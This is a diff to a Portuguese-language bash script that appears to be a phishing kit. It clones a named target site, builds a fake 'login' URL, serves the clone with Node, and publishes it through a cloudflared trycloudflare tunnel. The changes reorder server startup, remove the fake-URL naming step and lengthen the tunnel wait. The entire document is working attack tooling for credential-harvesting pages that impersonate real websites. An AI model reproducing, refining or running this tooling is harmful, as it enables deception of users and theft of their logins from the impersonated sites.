@@ -42,13 +42,6 @@ case "$CHOICE" in
     echo ""
     echo "[!] Alvo: $URL"
     echo "[!] Dominio: $DOMAIN"
-    echo ""
-    echo -n "Nome pra URL (ex: autocarlocadora): "
-    read NAME
-    NAME=$(echo "$NAME" | tr -d '\r' | xargs | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9]//g')
-    [ -z "$NAME" ] && NAME="login"
-    echo "[!] URL falsa: https://${NAME}.com.br"
-
     # --- CLONAR SITE ---
     echo ""
     echo "[...] Clonando site..."
@@ -241,23 +234,24 @@ SERVEREOF
         fi
     fi
 
+    # --- INICIAR SERVIDOR ---
+    echo ""
+    echo "[*] Iniciando servidor..."
+    echo ""
+    node "$SERVER_FILE" &
+    SERVER_PID=$!
+    sleep 2
+
     CF_URL=""
     if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ]; then
         echo ""
         echo "[...] Criando tunnel... aguarde..."
         echo ""
 
-        # Garante que o servidor escuta em todas as interfaces (0.0.0.0)
-        # para o cloudflared conseguir acessar
-        export PORT
-        node "$SERVER_FILE" &
-        SERVER_PID=$!
-        sleep 2
-
         cloudflared tunnel --url "http://0.0.0.0:$PORT" > /tmp/cf_tunnel.log 2>&1 &
         CF_PID=$!
 
-        for i in $(seq 1 15); do
+        for i in $(seq 1 20); do
             sleep 1
             CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
             if [ -n "$CF_URL" ]; then
@@ -268,7 +262,7 @@ SERVEREOF
         if [ -n "$CF_URL" ]; then
             echo "[OK] Tunnel criado!"
         else
-            echo "[AVISO] Tunnel nao gerou URL em 15s. Verifique o cloudflared."
+            echo "[AVISO] Tunnel nao gerou URL em 20s. Verifique o cloudflared."
         fi
     fi
 
@@ -293,14 +287,6 @@ SERVEREOF
     echo ""
     echo "  Parar: Ctrl+C"
     echo ""
-
-    # --- INICIAR SERVIDOR (se nao iniciou com cloudflare) ---
-    if [ -z "$CF_URL" ]; then
-        echo "[*] Iniciando servidor..."
-        echo ""
-        node "$SERVER_FILE" &
-        SERVER_PID=$!
-    fi
 
     if [ -n "$CF_URL" ]; then
         echo ""
